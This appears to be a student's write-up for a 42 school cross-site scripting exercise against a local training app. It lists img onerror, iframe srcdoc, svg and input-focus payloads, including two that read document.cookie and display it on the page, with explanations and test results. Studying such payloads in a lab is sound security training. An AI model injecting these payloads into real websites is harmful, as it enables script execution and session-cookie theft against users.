# Exercise 00 — XSS Payloads

> Scope: These tests refer only to the provided local 42 training application. All payloads should be submitted through its input field and tested using its **Submit** button. Do not use them on websites without authorization.

## Payload 1 — IMG error event (confirmed alert)

```html
<img src=x onerror=alert('XSS')>
```

**How it works:** The invalid image source causes an error. The browser executes the `onerror` event handler when the injected HTML is interpreted.

**Observed result:** An alert containing `XSS` appeared.

## Payload 2 — Display cookie on the visible parent page (confirmed)

```html
<img src=x onerror="document.getElementById('output').textContent=document.cookie">
```

**How it works:** The handler reads cookies available to JavaScript and writes the value to the existing `output` element as text.

**Observed result:** The user confirmed that the cookie value appeared on the page.

**Note:** This replaces the content of the `output` element; it does not transmit the cookie anywhere.

## Payload 3 — Iframe `srcdoc` script (confirmed alert)

```html
<iframe srcdoc="<script>alert('XSS-3')</script>"></iframe>
```

**How it works:** `srcdoc` supplies HTML for the embedded document, including a script.

**Observed result:** An alert containing `XSS-3` appeared.

## Payload 4 — Show cookie inside iframe (reported working)

```html
<iframe srcdoc="<h3>Cookie Test</h3><script>document.body.append(document.createTextNode('Cookie: '+document.cookie))</script>"></iframe>
```

**How it works:** Adds visible text inside the embedded document using the cookie value available *in that iframe's context*.

**Observed result:** The user reported that the value was displayed as text in the iframe. For evaluation, verify the actual value, not only the label `Cookie:`. Depending on sandboxing, document origin, and cookie settings, the value can be empty.

## Additional tests — not confirmed as working

### Plain script element
```html
<script>alert('XSS')</script>
```
Result: No visible response during the initial test. Scripts inserted via `innerHTML` are generally not executed directly, even though other XSS mechanisms may still work.

### SVG load event
```html
<svg onload=alert('XSS-2')>
```
Result: Did not work in the reported test.

### Input focus event
```html
<input autofocus onfocus="alert('XSS-4')">
```
Result: Not independently confirmed. This depends on whether the injected element receives focus.

## Notes for peer evaluation
- Demonstrate the confirmed IMG payload and the cookie display in the browser.
- Explain what `onerror`, `srcdoc`, `innerHTML`, and `document.cookie` do.
- Do not claim that the iframe and the parent document necessarily have the same cookie access.
- Distinguish execution of arbitrary JavaScript from successful retrieval of a cookie value.
